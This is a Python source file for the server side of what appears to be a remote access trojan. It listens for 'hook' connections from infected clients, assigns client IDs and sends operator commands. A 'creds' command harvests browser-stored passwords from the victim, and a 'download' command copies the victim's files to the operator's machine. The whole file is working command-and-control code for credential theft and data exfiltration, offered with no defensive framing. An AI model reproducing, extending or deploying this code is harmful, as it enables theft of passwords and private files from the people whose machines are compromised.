import socket
import time
import sys

# Initializing and binding socket to address
address = ("localhost", 8080)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(address)
sock.listen(5)
print("server up and running\nListening for connections...\n")

clients = 0
i = 0


def HandleDownload(data, con):
    """
    function that handles downloading files from the client
    """
    # giving the file a name based on the upload file's name and path
    global i
    try:
        filename = data.decode().strip("file:").replace("/", "").replace("\\", "")
    except UnicodeDecodeError:
        # Exception in case filename can't be decoded, idk why it happens and I really can't be bothered to spend any more time fixing it
        filename = f"{i}"
    i += 1

    # opening file and writing recieved data as bytes

    file = open(filename, "wb")
    buffer = b""
    while True:
        data = con.recv(4096)
        if data.__contains__(b"file:"):
            print("file download finished...\n moving on to next file")
            HandleDownload(data, con)
            file.write(buffer)
            file.close()
            break
        if not data:
            print("download finished.")
            file.write(buffer)
            file.close()
            break
        buffer += data


def HandleCommand(command, con):
    """
    Handeling commands sent by the user to the client and their response
    """
    # Handeling the "creds" command, getting (encrypted) browser stored passwords

    if command.lower().__contains__("creds"):
        con.send(f"CID {command}".encode())
        response = con.recv(4096)
        if len(response) == 0:
            print("no response")
        else:
            print(response.decode("utf-8"))
        resp = input(">>>")
        con.send(resp.encode())
        response = con.recv(4096)
        if len(response) == 0:
            print("no response")
            pass
        print(response.decode("utf-8"))
        response = con.recv(4096)
        if response.__contains__(b"file:"):
            HandleDownload(response, con)
        else:
            print(response)

    # Handeling the "download" command, downloading files from the client
    if command.lower().__contains__("download"):
        con.send(f"CID {command}".encode())
        response = con.recv(4096)
        if len(response) == 0:
            print("no response")
        else:
            HandleDownload(response, con)


try:
    while True:
        con, addr = sock.accept()

        if con:
            print(f"got hook from {addr}")
            response = con.recv(4096)
            if response == b"CID_req":
                con.send(f"CID {str(clients)}".encode())
                clients += 1
            else:
                print(response.decode("utf-8"))

        command = input(">>>")
        if command is False:
            continue
        HandleCommand(command, con)

except KeyboardInterrupt:
    print("Interrupt recieved, exiting.\n")
    sock.close()
    sys.exit(1)
